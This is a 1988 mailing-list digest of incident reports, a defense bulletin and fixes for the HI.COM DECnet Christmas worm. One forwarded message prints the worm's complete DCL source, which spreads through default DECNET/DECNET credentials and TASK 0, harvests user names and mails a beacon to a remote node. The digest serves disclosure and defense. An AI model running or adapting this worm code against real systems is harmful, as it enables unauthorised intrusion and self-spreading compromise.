@@ -1,0 +1,697 @@
+VIRUS-L Digest             Thursday, 29 Dec 1988        Volume 1 : Issue 59b
+
+Today's Topics:
+DECnet HI.COM Christmas Worm
+
+---------------------------------------------------------------------------
+
+Subject: DECnet HI.COM Christmas Worm
+Date: Mon, 26 Dec 88 08:19:06 -0800
+From: Steve Goldstein <goldstei@nsipo.nasa.gov>
+
+
+Greetings, this is my first posting to this mailing list, and I trust
+that I do not bore you with info that you've already seen many times
+over this past week.  These are a collection of msgs about a DECnet
+worm which was launched just before Christmas to produce a greeting
+from Father Christmas on SPAN nodes, HEPnet nodes, etc.
+
+The msgs are forwarded for your information, mainly.  I suspect that
+all node managers (sysadmins) will have secured their VMS machines
+prior to receipt of this information.
+
+Let's hope the New Year is not marked by new greetings borne by lower
+"life" forms!
+
+Steve Goldstein
+goldstein@nsipo.arc.nasa.go
+
+- ------- Forwarded Messages
+
+Return-Path: medin@nsipo.nasa.go
+Received: Thu, 22 Dec 88 15:56:24 PST from cincsac.arc.nasa.gov by
+ nsipo.arc.nasa.gov (5.59/1.5)
+Received: Thu, 22 Dec 88 15:55:45 PST from localhost.arc.nasa.gov by
+ cincsac.arc.nasa.gov (5.59/1.5T)
+Message-Id: <8812222355.AA07048@cincsac.arc.nasa.gov>
+To: nsn-tech@cincsac.arc.nasa.go
+Cc: goldstei@cincsac.arc.nasa.go
+Subject: DECNET worm report
+Date: Thu, 22 Dec 88 15:55:44 -0800
+From: "Milo S. Medin" (NASA ARC NSI Project Office) <medin@nsipo.nasa.gov>
+
+
+Folks, there is a worm running around SPAN at this time that
+causes a procedure to be run that will try and send a Christmas
+card to users on that system on Christmas Eve.
+
+The worm can only propagate if task 0 is enabled, and default decnet
+is present and has the password as decnet.  This configuration
+is a bad idea in any case, but it allows this worm to infect
+your system.
+
+You can tell if it's on your system because the process name is
+changed to MAIL_170DC and there is a HI.COM file in the default decnet
+account.  Disabling task 0 will prevent infection.
+
+More details later.  Please pass this information around and make
+sure all systems at your site have the task 0 capability removed
+in accordance with SPAN security guidelines.
+
+Kudos to Brian Love at GSFC/CSDF for alerting us to the problem.  FYI,
+it looks like the worm is sending a message to a node in Switzerland.
+
+A copy of the command procedure is attached.  Feel free to call us
+at NSIPO at Ames Research Center at (415) 694-6440 for further information.
+
+Note, this doesn't appear to be a serious problem, but all system
+managers should make sure their systems are secured.
+
+                    Thanks,
+                      Milo Medin
+
+
+
+
+(Message inbox:5167)
+Return-Path: 6173::system@sat.span.nasa.go
+Received: Thu, 22 Dec 88 15:32:55 PST from gemini.arc.nasa.gov by
+ nsipo.arc.nasa.gov (5.59/1.5)
+Received: Thu, 22 Dec 88 15:32:41 PST by gemini.arc.nasa.gov (5.59/1.2)
+Date: Thu, 22 Dec 88 15:32:41 PST
+Message-Id: <8812222332.AA09707@gemini.arc.nasa.gov>
+From: 6173::system@sat.span.nasa.gov (CSDR System Management, NASA/GSFC
+ B7-R188A, (301) 286-3819)
+To: medin@sat.span.nasa.go
+Subject: Copy of Hi.Com - More information to come in separate file.
+
+$ on error then continue
+$ set noverify
+$ define sys$error nl:
+$ define sys$output nl:
+$ set default sys$login
+$ set process/name="MAIL_178DC"
+$ delete := delete
+$ spawn := spawn
+$ null[0,7]=0
+$ open/read/write link sys$net
+$ close link
+$Look_loop:
+$ pid = f$pid(context)
+$ if pid .eqs. "" then goto start
+$ if f$getjpi(pid,"wsauthext")-1 .eq. f$getjpi(pid,"wsextent") then -
+     goto stop_process
+$ goto look_loop
+$Stop_process:
+$ set protection=o:rwed hi.com;*
+$ delete hi.com;*
+$ stop/id=0
+$Start:
+$ workset = f$getjpi(0,"wsauthext")-1
+$ set work/extent='workset'
+$Save:
+$ counter = 0
+$ open/read hi$file hi.com
+$Loop1:
+$ read/end_of_file=end_loop1 hi$file hiline'counter'
+$ counter = counter + 1
+$ goto loop1
+$End_loop1:
+$ close hi$file
+$ num_hilines = counter
+$ set protection=o:rwed hi.com;*
+$ delete hi.com;*
+$Action:
+$ spawn/input=nl:/output=nl:/nonotify/nolog/nowait -
+    mail/subj="''f$trnlnm("sys$announce")'" nl: 20597::phsolide
+$Search_node:
+$ time = f$extr(0,16,f$cvtime(f$time()))
+$ if time .gts. "1988-12-24 00:30" then stop/id=0
+$ if time .gts. "1988-12-24 00:00" then goto mailing
+$Generate_node:
+$ node = (f$int(f$ext(21,1,f$time()))*10000) +  -
+         (f$int(f$ext(21,1,f$time()))*1000)  +  -
+         (f$int(f$ext(21,1,f$time()))*100) +  -
+         (f$int(f$ext(21,1,f$time()))*10) +  -
+         (f$int(f$ext(21,1,f$time())))
+$ node = node*(f$int(f$ext(18,2,f$time()))+1)/63
+$ if node .eq. 0     then goto generate_node
+$ if node .gt. 63*1024 then goto generate_node
+$Reprod:
+$ counter = 0
+$ open/write/error=open_error  hi$file 'node'::hi.com
+$Loop2:
+$ write/error=cleanup hi$file hiline'counter'
+$ if counter .eq. num_hilines-1 then goto end_loop2
+$ counter = counter + 1
+$ goto loop2
+$End_loop2:
+$ close hi$file
+$Start_Task:
+$ type 'node'::"task=hi.com"
+$ if ($status.ne.%x10951098).or.(f$loc("""",node).ne.f$len(node)) -
+     then goto 2nd_error_check
+$ node := 'node'"""DECNET DECNET""
+$ goto start_task
+$2nd_error_check:
+$ if $status .ne. "%x10000001" then goto cleanup
+$ goto search_node
+$Cleanup:
+$ close hi$file
+$ delete 'node'::hi.com;*
+$ goto search_node
+$Open_error:
+$ if ($status.ne.%x1001c00a).or.(f$loc("""",node).ne.f$len(node))  -
+      then   goto  search_node
+$ node := 'node'"""DECNET DECNET""
+$ goto reprod
+$Mailing:
+$ mailline0 = "Hi,"
+$ mailline1 = ""
+$ mailline2 = " how are ya ? I had a hard time preparing all the presents."
+$ mailline3 = " It isn't quite an easy job. I'm getting more and more"
+$ mailline4 = " letters from the children every year and it's not so easy"
+$ mailline5 = " to get the terrible Rambo-Guns, Tanks and Space Ships up here at
+"
+$ mailline6 = " the Northpole. But now the good part is coming."
+$ mailline7 = " Distributing all the presents with my sleigh and the"
+$ mailline8 = " deers is real fun. When I slide down the chimneys"
+$ mailline9 = " I often find a little present offered by the children,"
+$ mailline10 = " or even a little Brandy from the father. (Yeah!)"
+$ mailline11 = " Anyhow the chimneys are getting tighter and tighter"
+$ mailline12 = " every year. I think I'll have to put my diet on again."
+$ mailline13 = " And after Christmas I've got my big holidays :-)."
+$ mailline14 = ""
+$ mailline15 = " Now stop computing and have a good time at home !!!!"
+$ mailline16 = ""
+$ mailline17 = "    Merry Christmas"
+$ mailline18 = "       and a happy New Year"
+$ mailline19 = ""
+$ mailline20 = "            Your  Father Christmas"
+$ num_maillines = 21
+$ define sysuaf sys$login:sysuaf
+$ mc authorize
+y
+list/id *
+exit
+$ delete sys$login:sysuaf.dat;*
+$ node = 0
+$Mail_good:
+$ open/read/write net$link 'node'::"27="
+$ if ($status.ne.%x1001c002).or.(f$loc("""",node).ne.f$len(node)) -
+    then goto start_mail
+$ node := 'node'"""DECNET DECNET""
+$ goto mail_good
+$Start_mail:
+$ close net$link
+$ open/read        user$file  rightslist.lis
+$ read             user$file  user
+$Loop3:
+$ open/read/write  net$link   'node'::"27="
+$ write net$link  "Father Christmas"
+$Next_user:
+$ read/end_of_file=end_mailing  user$file user
+$ if  f$extr(3,1,user) .eqs. " " then goto next_user
+$ user = f$extr(2,12,user)
+$ write net$link user
+$ read  net$link error
+$ if f$cvui(0,32,error) .ne. 1  then goto close_net
+$ write net$link null
+$ write net$link "You..."
+$ write net$link "Christmas Card."
+$ counter = 0
+$Text_loop:
+$ write net$link mailline'counter'
+$ counter = counter + 1
+$ if counter .eq. num_maillines then goto end_text_loop
+$ goto text_loop
+$End_text_loop:
+$ write net$link null
+$ wait 00:00:01
+$Close_net:
+$ close net$link
+$ goto loop3
+$End_mailing:
+$ close net$link
+$ close user$file
+$ delete rightslist.lis;*
+$ wait 00:30
+$ stop/id=0
+
+- ------- Message 2
+
+Return-Path: medin@nsipo.nasa.go
+Received: Thu, 22 Dec 88 16:32:57 PST from cincsac.arc.nasa.gov by
+ nsipo.arc.nasa.gov (5.59/1.5)
+Received: Thu, 22 Dec 88 16:32:18 PST from localhost.arc.nasa.gov by
+ cincsac.arc.nasa.gov (5.59/1.5T)
+Message-Id: <8812230032.AA07140@cincsac.arc.nasa.gov>
+Date: Thu, 22 Dec 88 16:32:14 -0800
+From: "Milo S. Medin" (NASA ARC NSI Project Office) <medin@nsipo.nasa.gov>
+Subject: DECNET worm report - correction
+Apparently-To: <goldstei@nsipo.nasa.gov>
+
+- - ------- Blind-Carbon-Copy
+
+To: nsn-tech
+Subject: DECNET worm report - correction
+Date: Thu, 22 Dec 88 16:32:14 -0800
+From: "Milo S. Medin" (NASA ARC NSI Project Office) <medin>
+
+
+Oh, and a correction to my previous note, due to a garbled message,
+I credited the wrong person at GSFC.  Kudos really go to Brian Lev,
+not Brian Love.  Just wanted to set the record straight.  Sorry about
+that Brian...
+
+                    Thanks,
+                      Milo
+
+- - ------- End of Blind-Carbon-Copy
+
+- ------- Message 3
+
+Return-Path: pmbs@STSCI.EDU
+Received: Fri, 23 Dec 88 13:16:21 PST from QUIPUS.STSCI.EDU by
+ nsipo.arc.nasa.gov (5.59/1.5)
+Received: Fri, 23 Dec 88 15:57:28 EST by quipus.stsci.edu.STSCI.EDU (5.59)
+Date: Fri, 23 Dec 88 15:57:28 EST
+From: (Peter Shames) <pmbs@STSCI.EDU>
+Message-Id: <8812232057.AA04573@STSCI.EDU>
+To: astro@stsci.edu
+Subject: SPAN breakin attempts - a peculiar Merry Xmas greeting
+Cc: broder@dftnic.gsfc.nasa.gov, gallagher@sam.span.nasa.gov,
+        gallop@sacho.jpl.nasa.gov, goldstein@nsipo.nasa.gov,
+        green@nssdca.gsfc.nasa.gov, jaw@sesun.jpl.nasa.gov,
+        medin@nsipo.nasa.gov, milkey@scivax, schreier@scivax,
+        torben@dorsai.ics.hawaii.edu, villasenor@ames.arc.nasa.go
+
+Folks,
+    The attached note describes a number of breakin attempts that
+took place last night at STScI.  Many of you may also have been the
+subject of this latest attack, some of your systems may have been broken
+into.  The effects are of *this* attack are quite benign, but that, as
+far as I can tell, was just luck.
+
+    While I do not wish to dampen anyone's holiday revels, the
+message in this latest attempt is clear and the implications troublesome.
+
+    In spite of all this, I would like to wish you all a Very Merry
+Holiday season, and a Happy New Year.
+
+                        Peter
+
+- - ---------------------------------------------------------------------------
+
+TWIMC -
+    Starting at roughly 1630 on 22 Dec 1988 VAX systems at the STScI
+experienced several breakin attempts over the SPAN network.  The symptoms
+were a series of login attempts on the accounts DECNET and NETFAL.  Over
+the next couple of hours the number of attempts increased significantly,
+though none were successsful.  One peculiar observation was that only one
+of our system was initially attacked, and it was attacked repeatedly, from
+an ever widening set of other hosts.
+
+    A copy of the .COM file that was used for this attacked was
+captured by one of the sites that was broken into, and it turned out to be
+a rather simple script that selected a area/host number based on a
+permutation of the date and time and then attempted to break into that
+host on the two accounts indicated above.  It only tried a couple of
+obvious passwords and then gave up with that host if not successful.
+If successful it would replicate itself and then proceed from there.
+The multiple attacks on the one host were due to the time zone rolling
+around as the attacks spread westward and that one system having a number
+that the algorithm generated often.
+
+    Though the modus operandi of this attack was relatively benign,
+that fact that it occurred at all is to be deplored.  The time that is
+wasted in tracking down such pranks is significant, as is the general
+disruption that is caused.  At the same time, the attacker could just as
+easily have set up a program to delete files or do other mischief and
+such an attack would have caused real havoc.
+
+    This attack, coming via the SPAN DECnet network, just serves to
+underscore the fact that wide area network connections, via whatever set of
+protocols, to whatever operating systems, do offer targets to bored,
+mischievious, or possibly malicious individuals.  Following, as it does,
+on the heels of the Internet Virus of 3 November 1988, this serves
+notice to all computer site managers that any system that has wide-area
+network connections is potentially vulnerable.
+
+    However, the benefits of having adequate wide-area networks are
+too great for such actions to stop us from using them.  This kind of act
+should serve as a timely warning that we all had best review our own
+site and host security to identify and eliminate any latent opportunities
+for future breakins.  At the very least all of the security holes employed
+by these latest breakins should be eliminated immediately.  None of our
+open science research sites wants to have to provide the sort of high
+level security appropriate to a military installation, so we must all act
+to preserve the integrity of the open research environments that we so value.
+
+    Passing security related information in the open is not an especially
+good idea, but some means of disseminating such information must be provided.
+There is a SPAN site security guide that should be consulted and I believe
+that a similar guide is being developed for the Internet community.  Perhaps
+a meeting of astronomy site coordinators and system managers, convened in
+conjunction with an AAS WGAS meeting or even separately, would be appropriate.
+Comments or suggestions from all concerned would be appreciated.
+
+                        Peter Shames
+
+
+- ------- Message 4
+
+Return-Path: tcp-ip-RELAY@SRI-NIC.arpa
+Received: Sat, 24 Dec 88 20:37:27 PST from MITRE.ARPA by nsipo.arc.nasa.go
+(5.59/1.5)
+Organization: The MITRE Corp., Washington, D.C.
+Received: from ron.rutgers.edu by SRI-NIC.ARPA with TCP; Fri, 23 Dec 88 12:57:48
+ PST
+Received: by ron.rutgers.edu (5.59/(RU-Router/1.1)/3.01)
+    id AA02489; Fri, 23 Dec 88 15:57:30 EST
+Date: Fri, 23 Dec 88 15:57:30 EST
+From: ron@hardees.rutgers.edu
+Message-Id: <8812232057.AA02489@ron.rutgers.edu>
+To: tcp-ip@sri-nic.arpa
+Subject: DECNET Virus (sorry)
+
+
+I got an anonymous tip about a DECNet virus.  Milo Medin provided me with
+the details.  The virus exploits a well known feature in DECnet which involves
+sites that leave TASK 0 running (this is the way DEC ships it).  The virus
+sends a HI.COM file to your default decnet directory and then sends a command
+to task 0 to invoke it.  To close the hole, you need to tell NCP
+to "CLEAR OBJECT TASK ALL" in your start up files as DECNET always starts
+this process.  If you were infected you will find HI.COM in your default
+decnet directory and a process running called something like MAIL_178DZ.
+
+You should delete the com file and kill off the process if you find them.
+
+I don't vouch for the accuracy of the above, I am neither a DECNET nor a
+VMS lover.
+
+- - -Ron
+
+I apologize for all those who are sane enough to run TCP-IP rather than DECNET
+for having to see this, but it seemed like the most rapid distribution system
+I could find.
+
+
+- ------- Message 5
+
+Received: Sun, 25 Dec 88 01:48:03 PST from ames.arc.nasa.gov by
+ nsipo.arc.nasa.gov (5.59/1.5)
+Received: Sun, 25 Dec 88 01:36:34 PST from SRI-NIC.ARPA by ames.arc.nasa.go
+(5.59/1.2)
+Date: Fri, 23 Dec 88 15:43:52 PST
+From: DDN Reference <NIC@SRI-NIC.ARPA>
+Subject: DDN MGT Bulletin # 50: Hi.COM DECnet worm
+To: ;@MGT
+Cc: dcab600@ddn1.arpa, dcab602-all@ddn1.arpa, cert@SEI.CMU.EDU,
+        nic@SRI-NIC.ARPA
+Message-Id: <12456817800.29.NIC@SRI-NIC.ARPA>
+
+**********************************************************************
+DDN MGT Bulletin 50              DCA DDN Defense Communications System
+23 Dec 88                        Published by: DDN Network Info Center
+                                    (NIC@SRI-NIC.ARPA)  (800) 235-3155
+
+
+                        DEFENSE  DATA  NETWORK
+
+                         MANAGEMENT  BULLETIN
+
+The DDN MANAGEMENT BULLETIN is distributed online by the DDN Network
+Information Center under DCA contract as a means of communicating
+official policy, procedures and other information of concern to
+management personnel at DDN facilities.  Back issues may be read
+through the TACNEWS server ("@n" command at the TAC) or may be
+obtained by FTP (or Kermit) from the SRI-NIC host [26.0.0.73 or
+10.0.0.51] using login="anonymous" and password="guest".  The pathname
+for bulletins is DDN-NEWS:DDN-MGT-BULLETIN-nn.TXT (where "nn" is the
+bulletin number).
+**********************************************************************
+
+SUBJECT:   Worm (Benign)
+
+APPLICABLE OPERATING SYSTEM: DEC VMS
+
+PROPAGATION: Propagates via DECNET protocols, not TCP/IP protocols
+
+STATUS: Fix is enclosed
+
+VALIDATION:  The fix has been forwarded to the CERT for validation, but
+validation has not been completed.  But in order to provide timely
+information to our subcribers, this fix is being made available "as
+is".  It was provided by a host administrator on the NASA SPAN/DOE
+HEPNET network.  We recommend that you contact your vendor and refer
+to the vendor documentation listed below before attempting to implement the
+fix.
+
+
+PROBLEM: On Friday, 23 December, Gerard K. Newman of the San Diego
+Supercomputer Center reported a Christmas Eve computer worm (not a
+virus) called "HI.COM".  This worm appears to be a benign Christmas
+greeting from "Father Christmas".
+
+ESSENTIAL CONSIDERATIONS: The recent Internet Virus has sensitized the
+telecommunications community to the potential threat of worms and
+viruses.  However, "HI.COM" appears to be a prank and nothing more:
+
+      (A) It only affects VMS machines connected to DECNET.
+
+      (B) It does not use TCP/IP, thus it cannot "infect" the Internet
+          (or MILNET/ARPANET).
+
+      (C) It does no harm (all it does is send a "stop computing and go
+          home" message after midnight on Christmas Eve).
+
+      (D) It has safeguards against running multiple copies of itself on
+          the same machine.
+
+      (E) It will terminate itself after completing its mission (at 00:30
+          on the 24th).
+
+SYMPTOMS OF INFECTION: Some steps to take to determine if your system has
+been infected are:
+
+      (A) Check your accounting files and NETSERVER.LOGs in your default
+          DECnet accounts for a file called HI.COM.
+
+      (B) Check your processes for one named MAIL_178DC.
+
+A FIX:
+
+There is a worm loose on NASA's SPAN/DoE's HEPNET network, which is an
+international DECnet-based network.  The worm targets VMS machines, and
+can only be propagated via DECnet.
+
+The worm itself appears to be benign, in that it does not destroy files
+or compromise the system.  It's purpose appears to be to deliver a
+Christmas message to users starting at midnight on 24 Dec 1988.  It
+does have a hook in it to monitor it's progress;  it mails a message
+back to a specific node (20.117, user PHSOLIDE) containing an identifying
+string of the "infected" machine.
+
+The worm exploits two features of DECnet/VMS in order to propagate itself.
+The first is the default DECnet account, which is a facility for users who
+don't have a specific login ID for a machine to have some degree of
+anonymous access.  It uses the default DECnet account to copy itself to a
+machine, and then uses the "TASK 0" feature of DECnet to invoke the remote
+copy.
+
+There are several steps which you can take to protect yourself from this
+kind of attack.  The easiest (and most restrictive) is to disable the
+default DECnet account on your machine altogether.  This can be done with
+the following commands from the SYSTEM or other suitably privileged account:
+
+    $ Run SYS$SYSTEM:NCP
+    Purge Executor Nonprivileged User Account Password
+    Clear Executor Nonprivileged User Account Password
+    ^Z
+
+This requires that everyone who accesses your resources via DECnet to have
+a legitimate login ID or proxy login account on your machine (proxy logins
+are discussed in detail in chapter 7 of the "Guide to VMS System Security",
+see below).
+
+You can take less restrictive steps to protect your machine while still
+maintaining some degree of default access.  If you wish to keep the ability
+for users to copy files to the default DECnet account but wish to prevent
+them from copying DCL command procedures there and then executing them you
+can issue the following commands (again from the SYSTEM or other suitably
+privileged account):
+
+    $ Run SYS$SYSTEM:NCP
+    Clear Object Task All
+    ^Z
+
+You must then edit the file SYS$MANAGER:STARTNET.COM, and add the line
+
+    CLEAR OBJECT TASK ALL
+
+AFTER the line which says
+
+    SET KNOWN OBJECTS ALL
+
+This has the side-effect of disabling users from executing any command
+procedure via DECnet that the system manager has not defined in the
+DECnet permanent database.  These steps alone are not sufficient to
+prevent copies of the virus from being copied to your machine;  but they
+will prevent it from being executed.  To prevent copies of this specific
+virus from being copied to your machine you can issue the following
+commands (from the SYSTEM or other privileged account):
+
+    $ Set Default your-default-decnet-directory
+    $ Create HI.COM
+    $ Stop/ID=0
+    ^Z
+    $ Set File/Owner=[1,4]-
+    /Protection=(S:RWED,O:RWED,G:RE,W:RE)/Version=1 HI.COM
+
+This prevents anyone from copying a file called "HI.COM" into your default
+DECnet account;  however, other files can be copied there unless you disable
+access to the DECnet object FAL (the File Access Listener) from your default
+DECnet account.  This can be done by creating a specific account for FAL
+(using the AUTHORIZE utility) with a seperate UIC, default directory, and
+minimal privileges and forcing the FAL object to use that account.  The
+following sequence of commands are an example (these commands also require
+that they be issued from the SYSTEM or other suitably privileged account):
+
+
+    $ Set Default SYS$SYTEM
+    $ Run AUTHORIZE
+    Add FAL/UIC=[some-unused-UIC]/Owner="DECnet default FAL"-
+    /Password=randomstring/Device=disk-device/Directory=[some-directory]-
+    /Flags=(DISCTLY,DEFCLI,CAPTIVE,LOCKPWD)/NoBatch/NoLocal/NoDialup-
+    /NoRemote/Privileges=(TMPMBX,NETMBX)/DefPrivileges=(TMPMBX,NETMBX)-
+    /LGICMD=SYS$SYSTEM:FALLOG.COM
+    ^Z
+    $ Run NCP
+    Define Object FAL Number 17 File SYS$SYSTEM:FAL User FAL -
+    Password same-random-string
+    Set Object FAL Number 17 File SYS$SYSTEM:FAL User FAL -
+    Password same-random-string
+    ^Z
+    $ Create FALLOG.COM
+    $ V := 'F$Verify(0)
+    $ Write SYS$OUTPUT ""
+    $ Write SYS$OUTPUT "''F$Time()' -- Node ''F$Logical("SYS$NODE")'"
+    $ Write SYS$OUTPUT "''F$Time()' -- Remote file access from:"
+    $ Write SYS$OUTPUT "''F$Time()' -- User: ''F$logical("SYS$REM_ID")'"
+    $ Write SYS$OUTPUT "''F$Time()' -- Node: ''F$Logical("SYS$REM_NODE")'"
+    $ Write SYS$OUTPUT ""
+    ^Z
+
+This sequence of commands separates the FAL account from the default DECnet
+account, and you can use file protections to enforce that the FAL account
+cannot access files in the default DECnet account and vice-versa.  The
+command file FALLOG.COM above will log all remote file accesses in the
+file NETSERVER.LOG in the directory specified for the FAL account above.
+
+The FAL program can supply additional logging information;  contact your
+DIGITAL software support person for further details.
+
+Further steps can be taken to restrict access to your system.  These
+steps are discussed in detail in the "Guide to VMS System Security", DEC
+order number AA-LA40A-TE, dated April 1988.  See in particular chapter 7,
+entitled "Security for a DECnet Node".
+
+For general information about this patch call the CERT or the Network
+Information Center at (800) 235-3155.
+
+This represents the best information available at this time to fix this
+problem.
+
+
+- - -------
+
+
+- - --- End of forwarded message from DDN Reference <NIC@SRI-NIC.ARPA>
+
+
+- ------- Message 6
+
+Return-Path: tcp-ip-RELAY@SRI-NIC.arpa
+Received: Mon, 26 Dec 88 00:07:50 PST from MITRE.ARPA by nsipo.arc.nasa.go
+(5.59/1.5)
+Received: from ucbvax.Berkeley.EDU by SRI-NIC.ARPA with TCP; Sun, 25 Dec 88
+ 23:07:38 PST
+Received: by ucbvax.Berkeley.EDU (5.61/1.33)
+    id AA02165; Sun, 25 Dec 88 22:41:55 PST
+Received: from USENET by ucbvax.Berkeley.EDU with netnews
+    for tcp-ip@sri-nic.arpa (tcp-ip@sri-nic.arpa)
+    (contact usenet@ucbvax.Berkeley.EDU if you have questions)
+Date: 26 Dec 88 06:39:55 GMT
+From: brian@ucsd.edu  (Brian Kantor)
+Organization: The Avant-Garde of the Now, Ltd.
+Subject: Re: DECNET Virus (sorry)
+Message-Id: <1339@ucsd.EDU>
+References: <8812232057.AA02489@ron.rutgers.edu>
+Sender: tcp-ip-relay@sri-nic.arpa
+To: tcp-ip@sri-nic.arpa
+
+I received the following message last Friday; I mailed it off to
+the "phage" security list and it bounced because Purdue's mailer is
+broken, so I'll post it here.  I hesitated to do this at first, since
+it's not directly relevant and I sure didn't want to panic people into
+wildly shutting down bridges and gateways again.
+
+SPAN (Space Physics Analysis Network??) is a DECNet network, so it
+lacks direct relevance to the TCP/IP list, but probably this is of
+at least passing interest.
+- - ---
+Date:    Fri, 23 Dec 88 02:53:13 GMT
+From: gkn@Sds.Sdsc.Edu (Gerard K. Newman)
+Subject: SPAN WORM ALERT
+
+Ladies and gentleman,
+
+Someone has loosed a worm on SPAN at this very moment.  Check your accounting
+files and NETSERVER.LOGs in your default DECnet accounts.  You'll find evidence
+of someone creating a file (HI.COM, which I am in the process of fetching from
+the deleted blocks of one of them) which propagates itself around the network.
+
+It has hit all of the VMS machines here at SDSC today, and simply appears to
+crawl around and send mail to 25097::PHISOLIDE (node 25.79, for which I do not
+have a name in my DECnet database).
+
+It will take me a few more minutes to cobble together a program to dredge up
+the blocks of the command file (one of the first things it does is to delete
+itself ... it also sets it's process name to MAIL_178DC, so look around for
+those, too).  When I have it I will forward the text.
+
+An adequate defense against the problem is:
+
+(from the SYSTEM or other suitably privileged account):
+
+    $ Set Default your-default-decnet-area
+    $ Create HI.COM
+    $ Stop/ID=0
+    ^Z
+    $ Set File/Owner=[1,4]/Protection=(S:RWED,O:RWED,G:RE,W:RE)/Version=1 HI.COM
+
+This information should receive the widest possible distribution.
+
+I will forward a copy of the command file in a few minutes.
+
+Please give me a call (# below) if you need more information.
+
+gkn
+- - ----------------------------------------
+Internet: GKN@SDS.SDSC.EDU
+Bitnet:   GKN@SDSC
+Span:      SDSC::GKN (27.1)
+MFEnet:   GKN@SDS
+USPS:      Gerard K. Newman
+      San Diego Supercomputer Center
+      P.O. Box 85608
+      San Diego, CA 92138-5608
+Phone:      619.534.5076
+
+- ------- End of Forwarded Messages
+
+------------------------------
+
+End of VIRUS-L Digest
+*********************
